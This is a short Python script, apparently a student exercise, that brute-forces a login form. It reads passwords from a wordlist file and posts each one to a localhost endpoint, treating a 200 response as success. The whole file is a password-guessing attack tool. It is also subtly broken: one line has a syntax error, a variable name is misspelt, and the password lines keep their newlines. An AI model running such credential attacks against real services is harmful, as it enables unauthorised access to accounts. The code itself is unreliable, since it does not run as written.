import requests

# make this a user input string
#URL = 'http://localhost:8000/teacher_login/'


# Using readlines()
Password_file = 'Passwords.txt'
url = 'http://localhost:5000'

file1 = open(Password_file, 'r')
Lines = file1.readlines()

Passwords_tried = 0

for password in Lines:
    Passwords_tried += 1
    print(password)
    payload = {'pword':password}
    response = requests.post(url,data=payload)
    if (response.status_code == 200)
        print("Password found: ",passowrd)

    #print (response.status_code)

print("-----------------------------")
print("no more passwords Found")
#lient = requests.Session()
#client.get(URL)
